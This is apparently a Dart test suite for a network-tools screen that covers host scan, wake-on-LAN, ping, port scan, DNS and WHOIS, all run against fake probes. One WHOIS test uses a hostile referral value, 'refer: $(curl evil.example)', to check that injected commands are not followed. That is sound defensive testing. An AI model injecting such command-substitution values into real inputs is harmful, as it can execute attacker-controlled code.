import 'dart:convert';
import 'dart:typed_data';

import 'package:drift/native.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:omniterm/data/app_database.dart';
import 'package:omniterm/data/app_repository.dart';
import 'package:omniterm/data/network/network_probe.dart';
import 'package:omniterm/domain/network_tools.dart';
import 'package:omniterm/platform/secret_store.dart';
import 'package:omniterm/ui/view_model/app_state.dart';
import 'package:omniterm/data/network/whois_client.dart';
import 'package:omniterm/ui/view_model/network_view_model.dart';

import 'support/fake_secure_storage.dart';

/// A network that exists only in the test. Nothing here touches a real socket, so the suite passes
/// identically on a laptop in a café and on a machine with a full homelab behind it.
class FakeProbe implements NetworkProbe {
  FakeProbe({this.open = const {}, this.names = const {}, this.local = '192.168.1.42'});

  /// `host:port` pairs that answer.
  final Set<String> open;

  /// Reverse-lookup answers.
  final Map<String, String> names;

  final String? local;

  final List<(String, int)> pinged = [];
  final List<(Uint8List, String, int)> sentPackets = [];
  final List<String> resolversTried = [];

  /// Resolver responses, by resolver address. A missing entry throws, simulating unreachable.
  Map<String, Uint8List> dnsResponses = {};

  @override
  Future<Duration?> tcpPing(
    String host,
    int port, {
    Duration timeout = const Duration(seconds: 2),
  }) async {
    pinged.add((host, port));
    return open.contains('$host:$port') ? const Duration(milliseconds: 12) : null;
  }

  @override
  Future<void> sendMagicPacket(Uint8List packet, String broadcast, int port) async {
    sentPackets.add((packet, broadcast, port));
  }

  @override
  Future<Uint8List> resolve(
    Uint8List query, {
    required String resolver,
    Duration timeout = const Duration(seconds: 3),
  }) async {
    resolversTried.add(resolver);
    final response = dnsResponses[resolver];
    if (response == null) throw const SocketFailure();
    // Echo the query's transaction id, as a real resolver does.
    final out = Uint8List.fromList(response);
    out[0] = query[0];
    out[1] = query[1];
    return out;
  }

  @override
  Future<String?> reverseLookup(String address) async => names[address];

  @override
  Future<String?> localAddress() async => local;
}

class SocketFailure implements Exception {
  const SocketFailure();

  @override
  String toString() => 'network unreachable';
}

/// Builds a DNS response with one A record for `example.com`.
Uint8List aRecordResponse({List<int> address = const [93, 184, 216, 34]}) {
  final out = BytesBuilder()
    ..add([0x12, 0x34, 0x81, 0x80])
    ..add([0x00, 0x01])
    ..add([0x00, 0x01])
    ..add([0x00, 0x00])
    ..add([0x00, 0x00])
    ..add([7])
    ..add(utf8.encode('example'))
    ..add([3])
    ..add(utf8.encode('com'))
    ..add([0])
    ..add([0x00, 0x01])
    ..add([0x00, 0x01])
    ..add([0xC0, 0x0C])
    ..add([0x00, 0x01])
    ..add([0x00, 0x01])
    ..add([0x00, 0x00, 0x01, 0x2C])
    ..add([0x00, 0x04])
    ..add(address);
  return out.toBytes();
}

/// A response carrying an NXDOMAIN code.
Uint8List nxdomainResponse() {
  final out = BytesBuilder()
    ..add([0x12, 0x34, 0x81, 0x83])
    ..add([0x00, 0x00])
    ..add([0x00, 0x00])
    ..add([0x00, 0x00])
    ..add([0x00, 0x00]);
  return out.toBytes();
}

/// Answers WHOIS queries from a script, recording who was asked.
class FakeWhois implements WhoisClient {
  FakeWhois(this.replies);

  /// Server host to reply. A [WhoisException] value is thrown instead of returned.
  final Map<String, Object> replies;

  final List<(String server, String target)> asked = [];

  @override
  Future<String> query(String server, String target) async {
    asked.add((server, target));
    final reply = replies[server];
    if (reply is WhoisException) throw reply;
    return (reply as String?) ?? '';
  }
}

void main() {
  late AppDatabase db;
  late AppRepository repo;
  late AppState app;

  setUp(() {
    db = AppDatabase(NativeDatabase.memory());
    repo = AppRepository(db, SecretStore(storage: FakeSecureStorage(<String, String>{})));
    app = AppState(repo);
  });

  tearDown(() async {
    app.dispose();
    await db.close();
  });

  Future<NetworkViewModel> boot(FakeProbe probe, {WhoisClient? whois}) async {
    await app.start();
    final vm = NetworkViewModel(app, probe: probe, whois: whois);
    await vm.start();
    await Future<void>.delayed(Duration.zero);
    return vm;
  }

  Future<void> settle() async {
    await Future<void>.delayed(Duration.zero);
    await Future<void>.delayed(Duration.zero);
  }

  group('host scan', () {
    test('the subnet is guessed from the device address', () async {
      // Typing a /24 on a phone is tedious, and on a home network it is almost always this one.
      final vm = await boot(FakeProbe(local: '10.0.5.77'));
      expect(vm.subnetPrefix, '10.0.5');
      vm.dispose();
    });

    test('a user-set subnet is not overwritten by the guess', () async {
      final vm = await boot(FakeProbe(local: '10.0.5.77'));
      vm.subnetPrefix = '172.16.0';
      await vm.guessSubnet();
      expect(vm.subnetPrefix, '172.16.0');
      vm.dispose();
    });

    test('only hosts that answer are listed, with their open ports', () async {
      final probe = FakeProbe(
        open: {'192.168.1.5:22', '192.168.1.5:80', '192.168.1.9:443'},
        names: {'192.168.1.5': 'nas.local'},
      );
      final vm = await boot(probe);
      vm.subnetPrefix = '192.168.1';
      await vm.scanSubnet();

      expect(vm.scanResults.map((h) => h.address), ['192.168.1.5', '192.168.1.9']);
      expect(vm.scanResults.first.openPorts, [22, 80]);
      expect(vm.scanResults.first.hostname, 'nas.local');
      expect(vm.scanResults.last.hostname, isNull, reason: 'no PTR record is not a failure');
      vm.dispose();
    });

    test('the sweep skips the network and broadcast addresses', () async {
      final probe = FakeProbe();
      final vm = await boot(probe);
      vm.subnetPrefix = '192.168.1';
      await vm.scanSubnet();

      final probed = probe.pinged.map((p) => p.$1).toSet();
      expect(probed, isNot(contains('192.168.1.0')));
      expect(probed, isNot(contains('192.168.1.255')));
      expect(probed, hasLength(254));
      vm.dispose();
    });

    test('results are ordered numerically, not lexically', () async {
      // .10 sorting before .9 reads as though addresses are missing.
      final probe = FakeProbe(open: {'192.168.1.9:22', '192.168.1.10:22', '192.168.1.100:22'});
      final vm = await boot(probe);
      vm.subnetPrefix = '192.168.1';
      await vm.scanSubnet();

      expect(vm.scanResults.map((h) => h.address), [
        '192.168.1.9',
        '192.168.1.10',
        '192.168.1.100',
      ]);
      vm.dispose();
    });

    test('a malformed subnet is refused before any probing', () async {
      final probe = FakeProbe();
      final vm = await boot(probe);
      vm.subnetPrefix = 'not a subnet';
      await vm.scanSubnet();

      expect(vm.error, contains('192.168.1'));
      expect(probe.pinged, isEmpty);
      vm.dispose();
    });
  });

  group('wake on LAN', () {
    test('a target is saved with a normalised MAC', () async {
      final vm = await boot(FakeProbe());
      expect(await vm.saveWolTarget(name: 'nas', macAddress: 'AA-BB-CC-DD-EE-FF'), isNull);
      await settle();
      expect(vm.wolTargets.single.macAddress, 'aa:bb:cc:dd:ee:ff');
      vm.dispose();
    });

    test('an unusable MAC is refused at save time', () async {
      // A saved target with a bad MAC looks fine in the list and silently does nothing forever.
      final vm = await boot(FakeProbe());
      expect(await vm.saveWolTarget(name: 'nas', macAddress: 'nope'), contains('MAC'));
      expect(await vm.saveWolTarget(name: '  ', macAddress: 'aa:bb:cc:dd:ee:ff'), contains('Name'));
      await settle();
      expect(vm.wolTargets, isEmpty);
      vm.dispose();
    });

    test('the broadcast address is derived from the host IP when not given', () async {
      final vm = await boot(FakeProbe());
      await vm.saveWolTarget(
        name: 'nas',
        macAddress: 'aa:bb:cc:dd:ee:ff',
        ipAddress: '192.168.4.20',
      );
      await settle();
      expect(vm.wolTargets.single.broadcastIp, '192.168.4.255');
      vm.dispose();
    });

    test('with no IP at all it falls back to the global broadcast', () async {
      final vm = await boot(FakeProbe());
      await vm.saveWolTarget(name: 'nas', macAddress: 'aa:bb:cc:dd:ee:ff');
      await settle();
      expect(vm.wolTargets.single.broadcastIp, '255.255.255.255');
      vm.dispose();
    });

    test('waking sends a correct magic packet to the broadcast address', () async {
      final probe = FakeProbe();
      final vm = await boot(probe);
      await vm.saveWolTarget(
        name: 'nas',
        macAddress: 'aa:bb:cc:dd:ee:ff',
        ipAddress: '192.168.4.20',
      );
      await settle();

      final message = await vm.wake(vm.wolTargets.single);

      final (packet, broadcast, port) = probe.sentPackets.single;
      expect(packet, magicPacketFor('aa:bb:cc:dd:ee:ff'));
      expect(broadcast, '192.168.4.255');
      expect(port, 9);
      // Fire-and-forget: "sent" is the most the app can honestly claim.
      expect(message, contains('sent'));
      vm.dispose();
    });

    test('deleting removes the target', () async {
      final vm = await boot(FakeProbe());
      await vm.saveWolTarget(name: 'nas', macAddress: 'aa:bb:cc:dd:ee:ff');
      await settle();
      await vm.deleteWolTarget(vm.wolTargets.single);
      await settle();
      expect(vm.wolTargets, isEmpty);
      vm.dispose();
    });
  });

  group('ping', () {
    test('reports each attempt, the success rate and the average', () async {
      final vm = await boot(FakeProbe(open: {'10.0.0.1:22'}));
      vm.pingTarget = '10.0.0.1';
      await vm.runPing();

      expect(vm.pingResults, hasLength(NetworkViewModel.pingAttempts));
      expect(vm.pingResults.every((r) => r.latency != null), isTrue);
      expect(vm.pingSuccessRate, 100);
      expect(vm.pingAverage, const Duration(milliseconds: 12));
      vm.dispose();
    });

    test('a host that does not answer reports 0% rather than an error', () async {
      // Unreachable is a result, not a failure — the point of pinging was to find out.
      final vm = await boot(FakeProbe());
      vm.pingTarget = '10.0.0.99';
      await vm.runPing();

      expect(vm.pingSuccessRate, 0);
      expect(vm.pingAverage, isNull);
      expect(vm.error, isNull);
      vm.dispose();
    });

    test('an empty target is refused', () async {
      final probe = FakeProbe();
      final vm = await boot(probe);
      await vm.runPing();
      expect(vm.error, isNotNull);
      expect(probe.pinged, isEmpty);
      vm.dispose();
    });

    test('the port is configurable, since there is no ICMP without root', () async {
      final probe = FakeProbe(open: {'10.0.0.1:443'});
      final vm = await boot(probe);
      vm.pingTarget = '10.0.0.1';
      vm.pingPort = 443;
      await vm.runPing();

      expect(probe.pinged.every((p) => p.$2 == 443), isTrue);
      expect(vm.pingSuccessRate, 100);
      vm.dispose();
    });
  });

  group('port scan', () {
    test('reports open and closed, ordered by port', () async {
      final probe = FakeProbe(open: {'10.0.0.1:22', '10.0.0.1:443'});
      final vm = await boot(probe);
      vm.portScanTarget = '10.0.0.1';
      vm.portSpec = '443,22,8080';
      await vm.runPortScan();

      expect(vm.portResults.map((r) => r.port), [22, 443, 8080]);
      expect(vm.openPorts.map((r) => r.port), [22, 443]);
      expect(vm.portResults.first.label, 'SSH');
      vm.dispose();
    });

    test('a range is expanded', () async {
      final probe = FakeProbe();
      final vm = await boot(probe);
      vm.portScanTarget = '10.0.0.1';
      vm.portSpec = '80-83';
      await vm.runPortScan();

      expect(vm.portResults.map((r) => r.port), [80, 81, 82, 83]);
      vm.dispose();
    });

    test('an unusable spec is refused with a usable message', () async {
      final probe = FakeProbe();
      final vm = await boot(probe);
      vm.portScanTarget = '10.0.0.1';
      vm.portSpec = 'nonsense';
      await vm.runPortScan();

      expect(vm.error, contains('22,80,443'));
      expect(probe.pinged, isEmpty);
      vm.dispose();
    });

    test('an empty target is refused', () async {
      final probe = FakeProbe();
      final vm = await boot(probe);
      vm.portSpec = '22';
      await vm.runPortScan();
      expect(vm.error, isNotNull);
      expect(probe.pinged, isEmpty);
      vm.dispose();
    });
  });

  group('DNS lookup', () {
    test('resolves and lists the records', () async {
      final probe = FakeProbe()..dnsResponses = {fallbackResolvers.first: aRecordResponse()};
      final vm = await boot(probe);
      vm.dnsTarget = 'example.com';
      await vm.runDnsLookup();

      expect(vm.dnsResults.single.type, 'A');
      expect(vm.dnsResults.single.value, '93.184.216.34');
      expect(vm.error, isNull);
      vm.dispose();
    });

    test('an unreachable resolver falls through to the next', () async {
      // One provider being blocked on a locked-down network is common, and reporting that as
      // "DNS is broken" would be wrong.
      final probe = FakeProbe()..dnsResponses = {fallbackResolvers[1]: aRecordResponse()};
      final vm = await boot(probe);
      vm.dnsTarget = 'example.com';
      await vm.runDnsLookup();

      expect(probe.resolversTried, fallbackResolvers.take(2));
      expect(vm.dnsResults, hasLength(1));
      vm.dispose();
    });

    test('NXDOMAIN is reported as itself and stops the fallback', () async {
      // The server answered; asking another one would turn a clear answer into a vague timeout.
      final probe = FakeProbe()
        ..dnsResponses = {
          fallbackResolvers.first: nxdomainResponse(),
          fallbackResolvers[1]: aRecordResponse(),
        };
      final vm = await boot(probe);
      vm.dnsTarget = 'nope.example';
      await vm.runDnsLookup();

      expect(vm.error, contains('No such name'));
      expect(vm.dnsResults, isEmpty);
      expect(probe.resolversTried, [fallbackResolvers.first]);
      vm.dispose();
    });

    test('every resolver failing says so plainly', () async {
      final probe = FakeProbe();
      final vm = await boot(probe);
      vm.dnsTarget = 'example.com';
      await vm.runDnsLookup();

      expect(vm.error, contains('Could not reach a DNS resolver'));
      expect(probe.resolversTried, fallbackResolvers);
      vm.dispose();
    });

    test('an empty name is refused before a packet is built', () async {
      final probe = FakeProbe();
      final vm = await boot(probe);
      await vm.runDnsLookup();
      expect(vm.error, isNotNull);
      expect(probe.resolversTried, isEmpty);
      vm.dispose();
    });

    test('an over-long label is reported rather than truncated', () async {
      final probe = FakeProbe();
      final vm = await boot(probe);
      vm.dnsTarget = '${'a' * 64}.com';
      await vm.runDnsLookup();

      expect(vm.error, contains('63 characters'));
      expect(probe.resolversTried, isEmpty);
      vm.dispose();
    });
  });

  test('a scanned host can be sent to another tool', () async {
    final vm = await boot(FakeProbe());
    vm.useHost('192.168.1.5', NetworkTab.portScan);

    expect(vm.activeTab, NetworkTab.portScan);
    expect(vm.portScanTarget, '192.168.1.5');

    vm.useHost('192.168.1.6', NetworkTab.ping);
    expect(vm.activeTab, NetworkTab.ping);
    expect(vm.pingTarget, '192.168.1.6');
    vm.dispose();
  });

  group('whois', () {
    test('a domain is asked of IANA, then of the registry it names', () async {
      // The first answer is a delegation record; the record a user came for is at the registry.
      final whois = FakeWhois({
        'whois.iana.org': 'domain: COM\nrefer: whois.verisign-grs.com\n',
        'whois.verisign-grs.com': 'Domain Name: EXAMPLE.COM\nRegistrar: Someone\n',
      });
      final vm = await boot(FakeProbe(), whois: whois);
      vm.whoisTarget = 'example.com';
      await vm.runWhois();

      expect(whois.asked, [
        ('whois.iana.org', 'example.com'),
        ('whois.verisign-grs.com', 'example.com'),
      ]);
      // Both replies are kept: the registry says who holds the delegation, the registrar says who
      // registered it, and dropping either loses a different fact.
      expect(vm.whoisResult, contains('domain: COM'));
      expect(vm.whoisResult, contains('Registrar: Someone'));
      expect(vm.whoisServers, ['whois.iana.org', 'whois.verisign-grs.com']);
      vm.dispose();
    });

    test('an address starts at a regional registry', () async {
      final whois = FakeWhois({'whois.arin.net': 'NetRange: 8.8.8.0 - 8.8.8.255\n'});
      final vm = await boot(FakeProbe(), whois: whois);
      vm.whoisTarget = '8.8.8.8';
      await vm.runWhois();

      expect(whois.asked.single.$1, 'whois.arin.net');
      expect(vm.whoisServers, ['whois.arin.net']);
      vm.dispose();
    });

    test('a reply with no referral is the answer', () async {
      final whois = FakeWhois({'whois.iana.org': 'Domain Name: EXAMPLE.COM\n'});
      final vm = await boot(FakeProbe(), whois: whois);
      vm.whoisTarget = 'example.com';
      await vm.runWhois();

      expect(whois.asked, hasLength(1));
      expect(vm.error, isNull);
      vm.dispose();
    });

    test('a referral that is not a hostname is not followed', () async {
      // The referral is free text from a remote server and decides what this app connects to next.
      final whois = FakeWhois({
        'whois.iana.org':
            r'refer: $(curl evil.example)'
            '\n',
      });
      final vm = await boot(FakeProbe(), whois: whois);
      vm.whoisTarget = 'example.com';
      await vm.runWhois();

      expect(whois.asked, hasLength(1));
      expect(vm.whoisResult, contains('refer:'));
      vm.dispose();
    });

    test('a referral back to the server that gave it is not followed', () async {
      // Registries do point at themselves, and a second identical query is a wasted round trip.
      final whois = FakeWhois({'whois.iana.org': 'refer: whois.iana.org\n'});
      final vm = await boot(FakeProbe(), whois: whois);
      vm.whoisTarget = 'example.com';
      await vm.runWhois();

      expect(whois.asked, hasLength(1));
      vm.dispose();
    });

    test('a referred server that fails leaves the first answer standing, and says why', () async {
      // The registry reply is still a real answer; discarding it because the second hop failed
      // would turn a partial result into nothing.
      final whois = FakeWhois({
        'whois.iana.org': 'domain: COM\nrefer: whois.verisign-grs.com\n',
        'whois.verisign-grs.com': const WhoisException('Connection refused'),
      });
      final vm = await boot(FakeProbe(), whois: whois);
      vm.whoisTarget = 'example.com';
      await vm.runWhois();

      expect(vm.whoisResult, contains('domain: COM'));
      expect(vm.whoisResult, contains('did not answer'));
      expect(vm.whoisServers, ['whois.iana.org']);
      expect(vm.error, isNull, reason: 'a partial answer is not a failed lookup');
      vm.dispose();
    });

    test('a first hop that fails is reported as an error, not as an empty record', () async {
      final whois = FakeWhois({'whois.iana.org': const WhoisException('Network unreachable')});
      final vm = await boot(FakeProbe(), whois: whois);
      vm.whoisTarget = 'example.com';
      await vm.runWhois();

      expect(vm.error, contains('Network unreachable'));
      expect(vm.whoisResult, isEmpty);
      vm.dispose();
    });

    test('a blank reply says nothing came back rather than showing an empty pane', () async {
      final whois = FakeWhois({'whois.iana.org': '   \n'});
      final vm = await boot(FakeProbe(), whois: whois);
      vm.whoisTarget = 'example.com';
      await vm.runWhois();

      expect(vm.error, contains('No registration records'));
      vm.dispose();
    });

    test('an empty target asks nothing', () async {
      final whois = FakeWhois({});
      final vm = await boot(FakeProbe(), whois: whois);
      vm.whoisTarget = '   ';
      await vm.runWhois();

      expect(whois.asked, isEmpty);
      expect(vm.error, contains('Enter a domain'));
      vm.dispose();
    });

    test('a second lookup while one is running is ignored', () async {
      final whois = FakeWhois({'whois.iana.org': 'Domain Name: EXAMPLE.COM\n'});
      final vm = await boot(FakeProbe(), whois: whois);
      vm.whoisTarget = 'example.com';

      await Future.wait([vm.runWhois(), vm.runWhois()]);

      expect(whois.asked, hasLength(1));
      vm.dispose();
    });

    test('a host from the scan can be sent straight to WHOIS', () async {
      final vm = await boot(FakeProbe(), whois: FakeWhois({}));
      vm.useHost('192.168.1.9', NetworkTab.whois);

      expect(vm.whoisTarget, '192.168.1.9');
      expect(vm.activeTab, NetworkTab.whois);
      vm.dispose();
    });
  });
}
